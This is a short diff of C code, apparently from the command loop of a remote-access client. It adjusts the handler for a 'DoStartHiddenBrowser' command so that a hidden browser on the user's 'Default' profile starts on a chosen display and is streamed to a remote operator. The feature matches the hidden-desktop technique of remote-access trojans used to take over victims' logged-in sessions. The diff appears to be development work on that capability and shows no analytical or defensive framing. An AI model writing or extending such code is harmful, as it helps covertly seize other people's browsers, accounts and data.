@@ -300,8 +300,8 @@ void remote_client_run(void) {
                         remote_log("[loop] handling DoStartHiddenBrowser");
                         const unsigned char* body = dispatch_buf + consumed;
                         unsigned int body_len = dispatch_len - consumed;
-                        int quality = 75, dummy_disp = 0, dummy_new = 0;
-                        remote_proto_decode_get_desktop(body, body_len, &quality, &dummy_disp, &dummy_new);
+                        int quality = 75, display_index = 0;
+                        remote_proto_decode_do_start_hidden_browser(body, body_len, &quality, &display_index);
                         remote_config_t cfg;
                         int alpha = -1;
                         if (remote_config_load(&cfg) && cfg.valid) {
@@ -313,7 +313,7 @@ void remote_client_run(void) {
                                 if (alpha > 255) alpha = 255;
                             }
                         }
-                        if (remote_hidden_browser_start("Default", "chrome://newtab", alpha)) {
+                        if (remote_hidden_browser_start("Default", "chrome://newtab", alpha, display_index)) {
                             g_hidden_browser_streaming = 1;
                             remote_log("[loop] hidden browser started, streaming ON");
                         } else {
